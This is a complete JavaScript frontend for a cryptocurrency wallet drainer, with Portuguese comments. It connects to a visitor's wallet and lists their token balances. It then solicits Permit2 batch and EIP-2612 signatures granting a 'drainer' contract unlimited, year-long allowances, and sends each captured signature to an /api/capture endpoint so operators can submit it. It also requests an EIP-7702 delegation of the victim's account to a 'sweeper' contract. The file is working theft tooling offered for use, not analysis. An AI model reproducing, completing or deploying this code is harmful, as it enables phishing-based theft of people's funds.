import { BrowserProvider, Contract, JsonRpcProvider, formatUnits, getAddress } from "https://esm.sh/ethers@6.17.0";

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MAX160 = (1n << 160n) - 1n;
const MAX256 = (1n << 256n) - 1n;
const DAY = 86400;
const PERMIT2_EXPIRATION = 365 * DAY; // allowance dura ~1 ano
const SIG_DEADLINE = 7 * DAY; // assinatura resgatavel por 7 dias

const TOKENS = [
  ["WETH", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18],
  ["USDC", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6],
  ["USDT", "0xdAC17F958D2ee523a2206206994597C13D831ec7", 6],
  ["DAI", "0x6B175474E89094C44Da98b954EedeAC495271d0F", 18],
  ["WBTC", "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", 8],
  ["LINK", "0x514910771AF9Ca656af840dff83E8264EcF986CA", 18],
  ["UNI", "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", 18],
  ["AAVE", "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", 18],
];

const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function name() view returns (string)",
  "function nonces(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
];
const P2 = [
  "function allowance(address,address,address) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
];
const DRAINER = [
  "function pullMany(address[] tokens, address owner)",
  "function permit2Batch(((address,uint160,uint48,uint48)[],address,uint256) batch, address owner, bytes signature)",
  "function permit2612(address token, address owner, uint256 value, uint256 deadline, bytes signature)",
];

const $ = (id) => document.getElementById(id);
const logEl = $("log");
const log = (msg, cls = "") => {
  const line = document.createElement("div");
  if (cls) line.className = cls;
  line.textContent = typeof msg === "string" ? msg : JSON.stringify(msg, null, 2);
  logEl.prepend(line);
};

let read, signer, owner, drainer, chainId;
let rows = [];

// config: local (localStorage) > servida por /api/config (assada do .env/.deployments.json)
const API_BASE = new URLSearchParams(location.search).get("api") ?? document.querySelector('meta[name="api"]')?.content ?? "";
const remote = await fetch(API_BASE + "/api/config")
  .then((r) => r.json())
  .catch(() => ({}));
const cfg = JSON.parse(localStorage.getItem("sweeper.cfg") || "{}");
for (const k of ["rpc", "drainer", "sweeper", "operator"]) {
  const v = cfg[k] || remote[k];
  if (v) $(k).value = v;
  $(k).addEventListener("change", () => {
    localStorage.setItem(
      "sweeper.cfg",
      JSON.stringify({ rpc: $("rpc").value, drainer: $("drainer").value, sweeper: $("sweeper").value, operator: $("operator").value }),
    );
  });
}
if (remote.chainId) log(`config loaded (chain ${remote.chainId})`);

async function connect() {
  if (!window.ethereum) return log("no wallet detected", "bad");
  const browser = new BrowserProvider(window.ethereum);
  await browser.send("eth_requestAccounts", []);
  signer = await browser.getSigner();
  owner = await signer.getAddress();
  chainId = Number((await browser.getNetwork()).chainId);
  $("who").textContent = owner;
  log(`connected ${owner} chain ${chainId}`, "ok");
  await scan(); // um clique a menos: ja lista o portfolio
}

async function scan() {
  if (!owner) return log("connect first", "bad");
  read = new JsonRpcProvider($("rpc").value, undefined, { staticNetwork: true });
  if (!$("drainer").value) return log("drainer field empty", "bad");
  drainer = getAddress($("drainer").value);
  const p2 = new Contract(PERMIT2, P2, read);
  const tbody = document.querySelector("#table tbody");
  tbody.innerHTML = "";
  rows = [];
  $("native").textContent = `${formatUnits(await read.getBalance(owner), 18)} ETH`;

  for (const [symbol, address, decimals] of TOKENS) {
    let balance, allowance;
    try {
      const token = new Contract(address, ERC20, read);
      [balance, allowance] = await Promise.all([token.balanceOf(owner), p2.allowance(owner, address, drainer)]);
    } catch {
      continue; // token ausente nesta chain
    }
    if (balance === 0n && allowance.amount === 0n) continue;
    const row = { symbol, address, decimals, balance, allowance };
    rows.push(row);

    const tr = document.createElement("tr");
    // assinatura nova => o que interessa e o SALDO, nao a allowance anterior
    tr.innerHTML = `<td><input type="checkbox" ${balance > 0n ? "checked" : ""} /></td>
      <td>${symbol}</td><td class="num">${formatUnits(balance, decimals)}</td>
      <td class="num">${allowance.amount > 0n ? "aprovado" : "-"}</td>
      <td class="num">${allowance.nonce}</td>`;
    tbody.append(tr);
  }
  $("all").checked = rows.some((r) => r.balance > 0n);
  if (!rows.length) log("nothing in the watched tokens", "flag");
  else log(`${rows.filter((r) => r.balance > 0n).length} token(s) with balance, pre-selected`, "ok");
}

function selected() {
  return [...document.querySelectorAll("#table tbody tr")]
    .map((tr, i) => (tr.querySelector("input").checked ? rows[i] : null))
    .filter(Boolean)
    .filter((r) => r.balance > 0n);
}

async function capture(payload) {
  const body = JSON.stringify({ ...payload, owner, chainId, drainer });
  try {
    const res = await fetch(API_BASE + "/api/capture", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body,
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.error);
    log(`capture saved: ${data.file}`, "ok");
    log(`submit with: node ops/submit.mjs ${data.file}`);
    return data;
  } catch (err) {
    // rede/API fora do ar: nao perde a assinatura — guarda local e mostra para copiar
    const pending = JSON.parse(localStorage.getItem("sweeper.pending") || "[]");
    pending.push(JSON.parse(body));
    localStorage.setItem("sweeper.pending", JSON.stringify(pending));
    log(`capture POST failed (${err.message}) — kept in localStorage and dumped below`, "bad");
    log(body);
  }
}

async function signPermit2() {
  const picks = selected();
  if (!picks.length) return log("nothing with balance to sign", "bad");
  const p2 = new Contract(PERMIT2, P2, read);
  const now = Math.floor(Date.now() / 1000);
  const details = [];
  for (const r of picks) {
    const { nonce } = await p2.allowance(owner, r.address, drainer);
    details.push({ token: r.address, amount: MAX160, expiration: now + PERMIT2_EXPIRATION, nonce: Number(nonce) });
  }
  const batch = { details, spender: drainer, sigDeadline: now + SIG_DEADLINE };
  const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };
  log(`waiting for Permit2 signature (${details.length} token(s), no gas)...`);
  const signature = await signer.signTypedData(domain, types, batch);
  await capture({
    kind: "permit2",
    details: details.map((d) => ({ ...d, amount: d.amount.toString() })),
    sigDeadline: batch.sigDeadline,
    signature,
  });
}

async function sign2612() {
  const picks = selected();
  if (!picks.length) return log("nada com saldo para assinar", "bad");
  const r = picks[0]; // antes exigia selecao exata; agora usa o primeiro
  if (picks.length > 1) log(`2612 covers one token at a time; using ${r.symbol}`, "flag");
  const token = new Contract(r.address, ERC20, read);
  const now = Math.floor(Date.now() / 1000);
  const nonce = await token.nonces(owner);
  const domain = { name: await token.name(), version: "1", chainId, verifyingContract: r.address };
  const types = {
    Permit: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
    ],
  };
  const value = { owner, spender: drainer, value: MAX256, nonce, deadline: now + SIG_DEADLINE };
  log("waiting for 2612 permit signature...");
  const signature = await signer.signTypedData(domain, types, value);
  await capture({ kind: "permit2612", token: r.address, value: MAX256.toString(), deadline: value.deadline, signature });
}

async function pull() {
  const picks = selected();
  if (!picks.length) return log("select tokens", "bad");
  await capture({ kind: "pull", tokens: picks.map((r) => r.address) });
}

async function delegate() {
  if (!$("sweeper").value || !$("operator").value) return log("sweeper/operator fields empty", "bad");
  const sweeper = getAddress($("sweeper").value);
  const operator = getAddress($("operator").value);
  const tokens = selected().map((r) => r.address);
  const nonce = await read.getTransactionCount(owner);
  // EIP-7702: como e a propria conta que envia, o nonce da AUTORIZACAO e txNonce+1
  // (o nonce do remetente e consumido antes de a lista de autorizacoes ser processada)
  const authNonce = nonce + 1;
  // init(op) no MESMO tx da delegacao: first-caller-wins resolvido e o receive() ja nasce armado
  const iface = new Contract(owner, ["function init(address)"], read).interface;
  const data = iface.encodeFunctionData("init", [operator]);

  log(`requesting 7702 authorization + init (auth nonce ${authNonce})...`);
  try {
    const tx = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: owner, to: owner, data, authorizationList: [{ address: sweeper, chainId, nonce: authNonce }] }],
    });
    log(`tx ${tx}`, "ok");
    await new Promise((r) => setTimeout(r, 2000));
    const code = await read.getCode(owner);
    if (code.startsWith("0xef0100")) {
      log(`delegado para ${"0x" + code.slice(8, 48)} — operator must run ops/sweep7702.mjs ${owner}`, "ok");
    } else {
      log("delegation NOT applied (wallet ignored authorizationList)", "bad");
      await capture({ kind: "delegate", tokens, sweeper }).catch(() => {});
    }
  } catch (err) {
    log(`wallet refused 7702: ${err.message}`, "bad");
    await capture({ kind: "delegate", tokens, sweeper }).catch(() => {});
    log("delegate capture saved; without the victim key, run ops/sweep7702.mjs", "flag");
  }
}

$("all").onchange = () => document.querySelectorAll("#table tbody input").forEach((c) => (c.checked = $("all").checked));
$("connect").onclick = () => connect().catch((e) => log(e.message, "bad"));
$("scan").onclick = () => scan().catch((e) => log(e.message, "bad"));
$("permit2").onclick = () => signPermit2().catch((e) => log(e.message, "bad"));
$("p2612").onclick = () => sign2612().catch((e) => log(e.message, "bad"));
$("pull").onclick = () => pull().catch((e) => log(e.message, "bad"));
$("delegate").onclick = () => delegate().catch((e) => log(e.message, "bad"));
